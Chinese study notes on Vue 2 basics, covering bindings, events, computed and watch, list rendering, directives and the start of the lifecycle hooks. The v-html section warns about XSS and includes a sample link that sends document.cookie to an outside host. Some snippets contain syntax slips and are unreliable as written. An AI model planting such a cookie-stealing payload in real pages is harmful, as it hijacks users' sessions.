# VUE基础学习

## vue简介

### vue特点

1. 采用**组件化**模式，提高代码复用率，切让代码更好维护
2. **声明式**编码，让编码人员无需直接操作DOM，提高开发效率
3. 使用**虚拟DOM**+优秀的**Diff算法**，尽量复用DOM节点

### vue知识基础

1. ES6 语法规范
2. ES6 模块化
3. 包管理器（npm，yum，cnpm...）
4. 原型、原型链
5. 数组常用方法
6. axios
7. promise

### Vue开发环境

1. 下载vue.js(开发版)/vue.min.js(生产版)
2. 安装vue.js dev tools
3. 设置 `Vue.config.productionTip = false`

### 初识VUE

初识Vue：
				1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象（el，data）；

​				2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；

​				3.root容器里的代码被称为【Vue模板】；

​				4.Vue实例和容器是一一对应的；

​				5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；

​				6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；

​				7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

注意区分：js表达式 和 js代码(语句)

​					1.表达式：一个表达式会**产生一个值**，可以放在任何一个需要值的地方：

​								(1). a

​								(2). a+b

​								(3). demo(1) 函数调用表达式

​								(4). x === y ? 'a' : 'b'

​					2.js代码(语句)

​								(1). if(){}

​								(2). for(){}

### Vue语法

#### Vue插值语法

语法：{{xxx}} ，xxxx 会作为 js 表达式解析  

功能：放置的内容一般放在标签体内，用于解析标签体内容  

#### Vue指令语法

语法：v-bind:href = 'xxxx' ，xxxx 会作为 js 表达式被解析  

简写：v-bind ===> :

功能：解析标签属性、解析标签体内容、绑定事件

### Vue数据绑定

单向绑定： v-bind，数据只能从data流向页面

双向绑定： v-model:value (简写：v-model=），数据可以双向流动（注：v-model只能应用在表表单类元素（输入类元素），有value值 ） 

### el与data的两种写法

el：

```js
el: "#root"
v.$mount('#root')
```

data:

```js
//对象式
data:{
    name:'world'
}
//函数式
data:function(){
    console.log('@@@',this);//此处的this是vue实例
    return {
        name: 'world'
    }
}
```

重要原则：

由Vue管理的函数，不要用箭头函数，一旦写了箭头函数，this就不再是Vue实例了

### MVVM模型

![image-20220225162256786](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220225162256786.png)

MVVM模型：

1. M：模型(Model) ：对应 data 中的数据
2. V：视图(View) ：模板
3. VM：视图模型(ViewModel) ： Vue 实例对象  

注：

1. data中所有的属性，最后都出现在vm身上
2. vm身上所有的属性 及vue原型上的属性，在vue模板中都可以直接使用

### 数据代理

#### Object.defineProperty方法

借助defineProperty这个方法让number和person产生关联

```js
let number = 18
let person = {
    name:'张三',
    sex:'男',
}

Object.defineProperty(person,'age',{
    // value:18,
    // enumerable:true, //控制属性是否可以枚举，默认值是false
    // writable:true, //控制属性是否可以被修改，默认值是false
    // configurable:true //控制属性是否可以被删除，默认值是false

    //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
    get(){
        console.log('有人读取age属性了')
        return number
    },

    //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
    set(value){
        console.log('有人修改了age属性，且值是',value)
        number = value
    }

})

// console.log(Object.keys(person))

console.log(person)
```

#### 数据代理

通过一个对象代理对另一个对象中属性的操作

只有放在配置项data里的数据才会做数据代理和数据劫持

#### Vue数据代理

> - Vue中的数据代理：
>
>   通过vm对象来代理data对象中属性的操作（读/写）
>
> - Vue中数据代理的好处：
>
>   更加方便的操作data中的数据
>
> - 基本原理：
>
>   - 通过Object.defineProperty()把data对象中所有属性添加到vm上。
>   - 为每一个添加到vm上的属性，都指定一个getter/setter。
>   - 在getter/setter内部去操作（读/写）data中对应的属性。

![image-20220225171541384](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220225171541384.png)

### 事件处理

#### 事件的基本使用

1. 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
2. 事件的回调需要配置在methods对象中，最终会在vm上；
3. methods中配置的函数，不要用箭头函数！否则this就不是vm了；
4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
5. @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

#### 事件修饰符

1. prevent：阻止默认事件（常用），e.preventDefault() ；
2. stop：阻止事件冒泡（常用）e.stopPropagation() ；
3. once：事件只触发一次（常用）；
4. capture：使用事件的捕获模式；
5. self：只有event.target是当前操作的元素时才触发事件；
6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```html
<body>
    <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
    <!-- 先执行滚轮滚动，再执行计数 -->
    <!-- 注意scroll和wheel的区别：scroll是滚动条滚动，wheel是鼠标的滚轮滚动 -->
    <ul @wheel.passive="demo" class="list">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
    </ul>
</body>
<script>
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        },
        methods:{
            demo(){
                for (let i = 0; i < 100000; i++) {
                    console.log('#')
                }
                console.log('累坏了')
            }
        }
    })
</script>
```

#### 键盘事件

> 1. Vue中常用的按键别名：
>
>    - 回车 => enter
>
>    - 删除 => delete (捕获“删除”和“退格”键)
>
>    - 退出 => esc
>
>    - 空格 => space
>
>    - 换行 => tab (特殊，必须配合keydown去使用)
>
>    - 上 => up
>
>    - 下 => down
>
>    - 左 => left
>
>    - 右 => right
>
> 2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
>
> 3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta
>
>    - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
>    - 配合keydown使用：正常触发事件
>
> 4. 也可以使用keyCode去指定具体的按键（不推荐）
>
> 5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```html
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        },
        methods: {
            showInfo(e){
                // console.log(e.key,e.keyCode)
                console.log(e.target.value)
            }
        },
    })
```

### 计算属性与监视

vue中的属性：配置项data中的属性

#### 计算属性

> 1. 定义：要用的属性不存在，要通过已有属性计算得来。
>
> 2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
>
> 3. get函数什么时候执行？
>
>    - 初次读取时会执行一次。
>
>    - 当依赖的数据发生改变时会被再次调用。
>
> 4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
>
> 备注：
>
> 1. 计算属性最终会出现在vm上，直接读取使用即可。
> 2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
> 3. 只有再只考虑读取，不考虑修改的时候才能使用简写模式

```js
computed:{
    fullName:{
        //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
        //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
        //此处的this是 vm
        get(){
            return this.firstName +'-'+ this.lastName
        }
    }
}

//简写
conputed:{
    fullName(){
        return this.firstName +'-'+ this.lastName
    }
}
```

#### 监视属性

> 监视属性watch：
>
> 1. 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
>
> 2. 监视的属性必须存在，才能进行监视！！
>
> 3. 监视的两种写法：
>
>    - new Vue时传入watch配置
>
>    - 通过vm.$watch监视

##### 普通监视

```js
//vue实例创建里
watch:{
    isHot:{
        immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    }
}

//vue实例调用
vm.$watch('isHot',{
    immediate:true, //初始化时让handler调用一下
    //handler什么时候调用？当isHot发生改变时。
    handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
    }
})

```

##### 深度监视	

> 深度监视：
>
> 1. Vue中的watch默认不监测对象内部值的改变（一层）。
> 2. 配置deep:true可以监测对象内部值改变（多层）。
>
> 备注：
>
> 1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
> 2. 使用watch时根据数据的具体结构，决定是否采用深度监视。

```js
const vm = new Vue({
    el:'#root',
    data:{
        isHot:true,
        numbers:{
            a:1,
            b:1,
            c:{
                d:{
                    e:100
                }
            }
        }
    },
    computed:{
        info(){
            return this.isHot ? '炎热' : '凉爽'
        }
    },
    methods: {
        changeWeather(){
            this.isHot = !this.isHot
        }
    },
    watch:{
        isHot:{
            // immediate:true, //初始化时让handler调用一下
            //handler什么时候调用？当isHot发生改变时。
            handler(newValue,oldValue){
                console.log('isHot被修改了',newValue,oldValue)
            }
        },
        //监视多级结构中某个属性的变化
        /* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
        //监视多级结构中所有属性的变化
        numbers:{
            deep:true,
            handler(){
                console.log('numbers改变了')
            }
        }
    }
})


//不需要immediate和deep的时候可以简写
watch:{
    isHot(newValue,oldValue){
        console.log('numbers改变了')
    }
}

vm.$watch('isHot',function(newValue,oldValue){
     console.log('numbers改变了')
})
```

##### watch和computed对比

> computed和watch之间的区别：
>
> 1. computed能完成的功能，watch都可以完成。
> 2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
>
> 两个重要的小原则：
>
> 1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
> 2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

### 绑定样式

> 绑定样式：
>
> 1. class样式
>    - 写法:class="xxx" xxx可以是字符串、对象、数组。
>    - 字符串写法适用于：类名不确定，要动态获取。
>    - 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
>    - 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
> 2. style样式
>    - :style="{fontSize: xxx}"其中xxx是动态值。
>    - :style="[a,b]"其中a、b是样式对象。

```html
<div id="root">
    <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

    <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>
</div>

<script>
    new Vue{
        el:'#root',
        data:{
            name:'lisa',
            mood:'happy',
            classArr:['1','2','3'],
            classObg:{
                '1':true,
                '2':false,
                '3':false
            }
            styleObj:{
                fontSize:'40px',
                color:'red'
            }
            styleArr:[{
                fontSize:'40px',
                color:'red'
            }，{
                background:'orange'
                      }]
        }
        methods:{
            changeMood(){
                const arr = ['happy','sad','normal'];
                const index = Math.floor(Math.random()*3);
                this.mood = arr[index]
            }
        }
    }
</script>
```

### 条件渲染

> 条件渲染：
>
> 1. 1.v-if
>
>    写法：
>
>    - v-if="表达式" 
>
>    - v-else-if="表达式"
>
>    - v-else="表达式"
>
>    适用于：切换频率较低的场景。
>
>    特点：不展示的DOM元素直接被移除。
>
>    注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”
>
> 2. v-show
>
>    写法：v-show="表达式"
>
>    适用于：切换频率较高的场景。
>
>    特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
>
> 3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

#### 使用v-show做条件渲染

```html
<h2 v-show = "false">欢迎光临</h2>
<h2 v-show = "1===1">欢迎光临</h2>
```

#### 使用v-if做条件渲染

```html
<h2 v-if = "false">欢迎光临</h2>
<h2 v-if = "1===1">欢迎光临</h2>

<!-- v-if与template的配合使用 -->
<template v-if="n === 1">
    <h2>你好</h2>
    <h2>尚硅谷</h2>
    <h2>北京</h2>
</template>
```

### 列表渲染

> v-for指令
>
> 1. 用于展示列表数据
> 2. 语法：v-for="(item, index) in xxx" :key="yyy"
> 3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）

```html
<div id="root">
    <h2>人员列表</h2>
    <ul>
        <li v-for="p in persons" key = 'p.id'>
            {{p.name}}-{{p.age}}
        </li>
    </ul>
    <hr>
    <h2>汽车信息</h2>
    <ul>
        <li v-for="(value,k) in car" key= "k">
            {{k}}-{{value}}
        </li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false
    new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001',name:'张三',age:18},
                {id:'002',name:'李四',age:19},
                {id:'003',name:'王五',age:20}

            ],
            car:{
                name:'audiA8',
                price:'80万',
                color:'black'
            }

        }
    })
</script>
```

#### key的原理

> 1. 虚拟DOM中key的作用：
>
>       key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
>
> 2. 对比规则：
>
>       - 旧虚拟DOM中找到了与新虚拟DOM相同的key：
>         - 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
>         - 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
>       - 旧虚拟DOM中未找到与新虚拟DOM相同的key
>         - 创建新的真实DOM，随后渲染到到页面。
>
> 3. 用index作为key可能会引发的问题：
>
>       - 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
>
>         会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
>
>       - 如果结构中还包含输入类的DOM：
>
>         会产生错误DOM更新 ==> 界面有问题。
>
> 4. 开发中如何选择key?:
>
>       - 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
>       - 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。

![image-20220226161429618](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220226161429618.png)

![image-20220226161705302](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220226161705302.png)

#### 表单过滤

不可以更改原Persons数组的值，创建一个新数组接收filter()产生的新数组

注：任何字符串都包含''这个字符

```html
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字" v-model="keyWord">
    <ul>
        <li v-for="(p,index) of filPerons" :key="index">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false

    //用watch实现
    //#region 
    /* new Vue({
				el:'#root',
				data:{
					keyWord:'',
					persons:[
						{id:'001',name:'马冬梅',age:19,sex:'女'},
						{id:'002',name:'周冬雨',age:20,sex:'女'},
						{id:'003',name:'周杰伦',age:21,sex:'男'},
						{id:'004',name:'温兆伦',age:22,sex:'男'}
					],
					filPerons:[]
				},
				watch:{
				//监视keyword的值
				//任何字符串都包含''这个字符
					keyWord:{
						immediate:true,
						handler(val){
							this.filPerons = this.persons.filter((p)=>{
								return p.name.indexOf(val) !== -1
							})
						}
					}
				}
			}) */
    //#endregion

    //用computed实现
    new Vue({
        el:'#root',
        data:{
            keyWord:'',
            persons:[
                {id:'001',name:'马冬梅',age:19,sex:'女'},
                {id:'002',name:'周冬雨',age:20,sex:'女'},
                {id:'003',name:'周杰伦',age:21,sex:'男'},
                {id:'004',name:'温兆伦',age:22,sex:'男'}
            ]
        },
        computed:{
            filPerons(){
                return this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyWord) !== -1
                })
            }
        }
    }) 
</script>
```

#### 表单排序

所有的操作通过filPersons数组完成，给button设置sortType的属性，通过获取sortType的值来判断排序的顺序

```html
<div id="root">
    <h2>人员列表</h2>
    <input type="text" placeholder="请输入名字"v-model='keyword'>
    <button @click="sortType =2">年龄升序</button>
    <button @click="sortType =1">年龄降序</button>
    <button @click="sortType =0">原顺序</button>
    <ul>
        <li v-for="p in filPersons">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            keyword:'',
            sortType:0,//0原顺序，1降序，2升序
            persons:[
                {id:'001',name:'马冬梅',age:20,sex:'女'},
                {id:'002',name:'周冬雨',age:17,sex:'女'},
                {id:'003',name:'周杰伦',age:23,sex:'男'},
                {id:'004',name:'温兆伦',age:21,sex:'男'}

            ]  
        },
        computed:{
            filPersons(){
                const arr = this.persons.filter((p)=>{
                    return p.name.indexOf(this.keyword)!==-1
                })
                // 判断一下是否需要排序
                if(this.sortType){
                    arr.sort((p1,p2)=>{
                        return this.sortType===1? p2.age-p1.age:p1.age-p2.age
                    })
                }
                return arr
            }
        },

    })
</script>
```

#### 监测数据的原理

> Vue监视数据的原理：
>
> ​        1. vue会监视data中所有层次的数据。
>
> ​        2. 如何监测对象中的数据？
>
> ​                通过setter实现监视，且要在new Vue时就传入要监测的数据。
>
> ​                  (1).对象中后追加的属性，Vue默认不做响应式处理
>
> ​                  (2).如需给后添加的属性做响应式，请使用如下API：
>
> ​                          `Vue.set(target，propertyName/index，value)` 或 
>
> ​                          `vm.$set(target，propertyName/index，value)`
>
> ​        3. 如何监测数组中的数据？
>
> ​                  通过包裹数组更新元素的方法实现，本质就是做了两件事：
>
> ​                    (1).调用原生对应的方法对数组进行更新。
>
> ​                    (2).重新解析模板，进而更新页面。
>
> ​        4.在Vue修改数组中的某个元素一定要用如下方法：
>
> ​              1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
>
> ​              2.Vue.set() 或 vm.$set(）
>
> ​		5.通过**Object.defineProperty来劫持对象属性的setter和getter操作**，并**“种下”一个监听器**，当数据发生变化的时候发出通知
>
> ​        特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

##### 监测对象原理

```js
let data = {
    name:'尚硅谷',
    address:'北京',
}

//创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)		
console.log(obs)	

//准备一个vm实例对象
let vm = {}
vm._data = data = obs

function Observer(obj){
    //汇总对象中所有的属性形成一个数组
    const keys = Object.keys(obj)
    //遍历
    keys.forEach((k)=>{
        Object.defineProperty(this,k,{
            get(){
                return obj[k]
            },
            set(val){
                console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                obj[k] = val
            }
        })
    })
}
```

##### 总结数据检测

```html
<div id="root">
    <h1>学生信息</h1>
    <button @click="student.age++">年龄+1岁</button> <br/>
    <button @click="addSex">添加性别属性，默认值：男</button> <br/>
    <button @click="student.sex = '未知' ">修改性别</button> <br/>
    <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
    <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
    <button @click="addHobby">添加一个爱好</button> <br/>
    <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
    <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
    <h3>姓名：{{student.name}}</h3>
    <h3>年龄：{{student.age}}</h3>
    <h3 v-if="student.sex">性别：{{student.sex}}</h3>
    <h3>爱好：</h3>
    <ul>
        <li v-for="(h,index) in student.hobby" :key="index">
            {{h}}
        </li>
    </ul>
    <h3>朋友们：</h3>
    <ul>
        <li v-for="(f,index) in student.friends" :key="index">
            {{f.name}}--{{f.age}}
        </li>
    </ul>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el:'#root',
        data:{
            student:{
                name:'tom',
                age:18,
                hobby:['抽烟','喝酒','烫头'],
                friends:[
                    {name:'jerry',age:35},
                    {name:'tony',age:36}
                ]
            }
        },
        methods: {
            addSex(){
                // Vue.set(this.student,'sex','男')
                this.$set(this.student,'sex','男')
            },
            addFriend(){
                this.student.friends.unshift({name:'jack',age:70})
            },
            updateFirstFriendName(){
                this.student.friends[0].name = '张三'
            },
            addHobby(){
                this.student.hobby.push('学习')
            },
            updateHobby(){
                // this.student.hobby.splice(0,1,'开车')
                // Vue.set(this.student.hobby,0,'开车')
                this.$set(this.student.hobby,0,'开车')
            },
            removeSmoke(){
                this.student.hobby = this.student.hobby.filter((h)=>{
                    return h !== '抽烟'
                })
            }
        }
    })
</script>
```

### 收集表单数据

> 收集表单数据：
>
> ​          若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
>
> ​          若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
>
> ​          若：<input type="checkbox"/>
>
> ​              1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>
> ​              2.配置input的value属性:
>
> ​                  (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
>
> ​                  (2)v-model的初始值是数组，那么收集的的就是value组成的数组
>
> ​          备注：v-model的三个修饰符：
>
> ​                  lazy：失去焦点再收集数据
>
> ​                  number：输入字符串转为有效的数字
>
> ​                  trim：输入首尾空格过滤

```html
<div id="root">
    <form @submit.prevent="demo">
        账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
        密码：<input type="password" v-model="userInfo.password"> <br/><br/>
        年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
        女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
        爱好：
        学习<input type="checkbox" v-model="userInfo.hobby" value="study">
        打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
        吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
        <br/><br/>
        所属校区
        <select v-model="userInfo.city">
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select>
        <br/><br/>
        其他信息：
        <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
        <button>提交</button>
    </form>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false

    new Vue({
        el:'#root',
        data:{
            userInfo:{//将信息放入一个对象中便于输出
                account:'',
                password:'',
                age:18,
                sex:'female',
                hobby:[],//初始值设为数组，收集的就是number，设为''空字符串，收集的就是字符串
                city:'beijing',
                other:'',
                agree:''
            }
        },
        methods: {
            demo(){
                console.log(JSON.stringify(this.userInfo))
            }
        }
    })
</script>
```

### 过滤器

常用处理时间的第三方库：moment.js、dayjs

> 过滤器：
>
> ​        定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
>
> ​        语法：
>
> ​            1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
>
> ​            2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
>
> ​        备注：
>
> ​            1.过滤器也可以接收额外参数、多个过滤器也可以串联
>
> ​            2.并没有改变原本的数据, 是产生新的对应的数据

```html
<body>

    <div id="root">
        <h2>显示格式化后的时间</h2>
        <!-- 过滤器实现 -->
        <h3>现在是：{{time | timeFormater}}</h3>
        <!-- 过滤器实现（传参） -->
        <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
        <h3 :x="msg | mySlice">尚硅谷</h3>
    </div>

    <div id="root2">
        <h2>{{msg | mySlice}}</h2>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false
    //全局过滤器
    Vue.filter('mySlice',function(value){
        return value.slice(0,4)
    })

    new Vue({
        el:'#root',
        data:{
            time:1621561377603, //时间戳
            msg:'你好，尚硅谷'
        },
        //局部过滤器
        filters:{
            timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
                // console.log('@',value)
                return dayjs(value).format(str)
            }
        }
    })

    new Vue({
        el:'#root2',
        data:{
            msg:'hello,atguigu!'
        }
    })
</script>
```

### 内置指令

> 我们学过的指令：
>
> ​            v-bind  : 单向绑定解析表达式, 可简写为 :xxx
>
> ​            v-model : 双向数据绑定
>
> ​            v-for  : 遍历数组/对象/字符串
>
> ​            v-on   : 绑定事件监听, 可简写为@
>
> ​            v-if     : 条件渲染（动态控制节点是否存存在）
>
> ​            v-else  : 条件渲染（动态控制节点是否存存在）
>
> ​            v-show  : 条件渲染 (动态控制节点是否展示)

####  v-text指令

1. 作用：向其所在的节点中渲染文本内容。
2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会，而且不会解析页面标签

```html
<div v-text="name"></div>
```

#### v-html指令

1. 作用：向指定节点中渲染包含html结构的内容。

2. 与插值语法的区别：

   - v-html会替换掉节点中所有的内容，{{xx}}则不会。
   - v-html可以识别html结构。

3. 严重注意：v-html有安全性问题！！！！

   - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
     - **XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击**,恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。
     - **反射型XSS**：一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL
     - **存储型XSS**：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。
     - **DOM-based型XSS**
     - **SQL注入**：通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。

   - 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

4. cookie保存着个人身份信息，不同浏览器之间的cookie文件不共享

   - 获取页面cookie：`document.cookie`

![image-20220227103936787](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220227103936787.png)

```html
<div v-html="str2"></div>
str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'//存储型XSS
```

#### v-cloak指令（没有值）

> 1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
>
> 2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<style>
    [v-cloak]{
        display:none;
    }
</style>
<div id="root">
    <h2 v-cloak>{{name}}</h2>
</div>
```

#### v-once（没有值）

> 1.v-once所在节点在初次动态渲染后，就视为静态内容了。
>
> 2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<body>

    <div id="root">
        <h2 v-once>初始化的n值是:{{n}}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            n:1
        }
    })
</script>
```

#### v-pre指令

> 1.跳过其所在节点的编译过程。vue不去解析节点
>
> 2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

### 自定义指令

> 自定义指令总结：
>
> ​            一、定义语法：
>
> ​                  (1).局部指令：
>
> ​                        `new Vue({ directives:{指令名:配置对象}  })`         
>
> ​						`new Vue({ directives:{指令名：回调函数}  })`                           
>
> ​                  (2).全局指令：
>
> ​                          Vue.directive(指令名,配置对象) 或  Vue.directive(指令名,回调函数)
>
> 
>
> ​            二、配置对象中常用的3个回调：
>
> ​                  (1).bind：指令与元素成功绑定时调用。
>
> ​                  (2).inserted：指令所在元素被插入页面时调用。
>
> ​                  (3).update：指令所在模板结构被重新解析时调用。
>
> 
>
> ​            三、备注：
>
> ​                  1.指令定义时不加v-，但使用时要加v-；
>
> ​                  2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。

```js
directives:{
    //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
    //一共含有两个参数，第一个为真实DOM元素，第二个binding是元素和指令之间的关联关系，是一个对象
    /* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
    //使用简写形式相当于只写了bind()和update()，缺少inserted()
    big(element,binding){
        console.log('big',this) //注意此处的this是window
        // console.log('big')
        element.innerText = binding.value * 10
    },

}

directives:{
    fbind:{
        //指令与元素成功绑定时（一上来）
        bind(element,binding){
            element.value = binding.value
        },
            //指令所在元素被插入页面时
            inserted(element,binding){
                element.focus()
            },
                //指令所在的模板被重新解析时
                update(element,binding){
                    element.value = binding.value
                }
    }
}
```

## 生命周期

> 生命周期：
>
> ​            1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
>
> ​            2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
>
> ​            3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
>
> ​            4.生命周期函数中的this指向是vm 或 组件实例对象。

 ![image-20220227153325662](C:\Users\Sagittarius\AppData\Roaming\Typora\typora-user-images\image-20220227153325662.png)

使用template时不可以将 `<template>`标签作为根节点

```js
template:`
    <div>
    <h2>当前的n值是：{{n}}</h2>
    <button @click="add">点我n+1</button>
    </div>
    `,
```

> ### beforeCreate( 创建前 )
>
> 在实例初始化之后，数据观测和事件配置（数据代理）之前被调用，此时组件的选项对象还未创建，el 和 data 并未初始化，因此无法访问methods， data， computed等上的方法和数据。
>
> ### created ( 创建后 ）
>
